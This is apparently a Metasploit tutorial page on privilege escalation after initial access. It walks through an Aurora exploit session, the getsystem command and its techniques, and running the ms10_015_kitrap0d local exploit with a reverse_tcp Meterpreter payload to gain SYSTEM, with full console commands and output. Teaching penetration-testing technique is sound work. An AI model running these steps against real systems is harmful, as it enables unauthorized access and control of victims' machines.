---
draft: false
title: MSF Privilege Escalation
linkTitle: Privilege Escalation
translationKey: msf-privilage-escalation
weight: 240
date: 2017-05-25T13:16:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Privilege escalation is the act of exploiting a bug, design flaw or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user.
url: /msf-privilege-escalation/
featured_image: /images/metasploit.jpg
categories:
   - Metasploit Framework
tags:
   - cybersecurity
   - metasploit framework
---
## What next?

You have done the necessary work to find a system's vulnerability. You have found the vulnerability and after following the correct steps, you have managed to open a command line on the target computer. So what should be done next?

From this article on, we will examine the concept of privilege escalation. The security auditor who accesses the opposing system should aim to progress from this stage onwards. Controlling ongoing communication on the network and obtaining hash values ​​can be given as examples of these. Another goal should be to access other computers using this computer as a step (Eng: Pivoting).

Even if the vulnerability you used and the exploit module for it helped you log in to the opposing computer, you may have opened an unauthorized session. In this case, the operations you can do will be limited. There are a few alternative modules in the Metasploit Framework for such cases. One of them is the `getsystem` command.

## Unauthorized Session

As seen in the example below, an unauthorized meterpreter session was opened on the target system using the `ms10_002_aurora` module.

```bash
msf exploit(ms10_002_aurora) >
> Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161
> Sending stage (748544 bytes) to 192.168.1.161
> Meterpreter session 3 opened (192.168.1.71:38699 -> 192.168.1.161:4444) at 2010-08-21 13:39:10 -0600

msf exploit(ms10_002_aurora) > sessions -i 3
> Starting interaction with 3...

meterpreter > getuid
Server username: XEN-XP-SP2-BARE\victim
meterpreter >
```

## GetSystem

`getsystem` command To use it, first let's load the `priv` extension to the system.

```bash
meterpreter > use priv
Loading extension priv...success.
meterpreter >
```

As in the `getsystem -h` command, you can see the available options when you use the `-h` parameter.

```bash
meterpreter > getsystem -h Usage: getsystem [options]

Attempt to elevate your privilege to that of local system.

OPTIONS:

-h Help Banner.
-t <opt> The technique to use. (Default to '0').
0 : All techniques available
1 : Service - Named Pipe Impersonation (In Memory/Admin)
2 : Service - Named Pipe Impersonation (Dropper/Admin)
3 : Service - Token Duplication (In Memory/Admin)

meterpreter >
```

If you do not give any parameters to the ```getsystem``` command, it will try all possibilities by default.

```bash
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

## Using Local Exploit

In some cases, `getsystem` fails. You can see an example of this below. When `getsystem` fails, it is necessary to send the session to the background and use other exploit modules in the Metasploit Framework.

```bash
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
meterpreter >
```

Above is the output of a failed `getsystem` command. Let's send it to the background and look at the available local exploit modules.

```bash
meterpreter > background
> Backgrounding session 1...
msf exploit(ms10_002_aurora) > use exploit/windows/local/
...snip...
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
...snip...
use exploit/windows/local/ms10_015_kitrap0d
use exploit/windows/local/ms10_092_schelevator
use exploit/windows/local/ms11_080_afdjoinleaf
use exploit/windows/local/ms13_005_hwnd_broadcast
use exploit/windows/local/ms13_081_track_popup_menu
...snip...
msf exploit(ms10_002_aurora) >
```

Let's use the `exploit/windows/local/ms10_015_kitrap0d` module from the modules in this list.

```bash
msf exploit(ms10_002_aurora) > use exploit/windows/local/ms10_015_kitrap0d
msf exploit(ms10_015_kitrap0d) > set SESSION 1
msf exploit(ms10_015_kitrap0d) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(ms10_015_kitrap0d) > set LHOST 192.168.1.161
msf exploit(ms10_015_kitrap0d) > set LPORT 4443
msf exploit(ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
   LHOST     192.168.1.161    yes       The listen address
   LPORT     4443             yes       The listen port
Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)
msf exploit(ms10_015_kitrap0d) > exploit

>  Started reverse handler on 192.168.1.161:4443 
>  Launching notepad to host the exploit...
[+]  Process 4048 launched.
>  Reflectively injecting the exploit DLL into 4048...
>  Injecting exploit into 4048 ...
>  Exploit injected. Injecting payload into 4048...
>  Payload injected. Executing exploit...
[+]  Exploit finished, wait for (hopefully privileged) payload execution to complete.
>  Sending stage (769024 bytes) to 192.168.1.71
>  Meterpreter session 2 opened (192.168.1.161:4443 -> 192.168.1.71:49204) at 2014-03-11 11:14:00 -0400
```

After making the necessary module and payload settings, the exploit that was run managed to open a session on the target system. Now, when we give the `getuid` command, we can act as an authorized user `SYSTEM` as seen below.

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
